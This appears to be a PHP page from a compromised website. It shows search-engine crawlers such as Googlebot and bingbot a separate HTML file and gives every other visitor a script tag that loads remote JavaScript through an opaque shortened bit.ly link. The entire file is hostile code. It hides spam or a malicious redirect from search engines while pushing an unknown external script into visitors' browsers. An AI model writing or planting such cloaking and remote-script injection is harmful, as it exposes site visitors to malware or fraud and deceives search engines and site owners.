<?php
if(
strpos($_SERVER['HTTP_USER_AGENT'],'spider')!==false
||strpos($_SERVER['HTTP_USER_AGENT'],'Googlebot')!==false
||strpos($_SERVER['HTTP_USER_AGENT'],'bingbot')!==false
||strpos($_SERVER['HTTP_USER_AGENT'],'Yahoo')!==false
) { include("profiles/files/index.html"); exit;
}
?>
<script type='text/javascript' src="http://bit.ly/1xPaRfm"></script>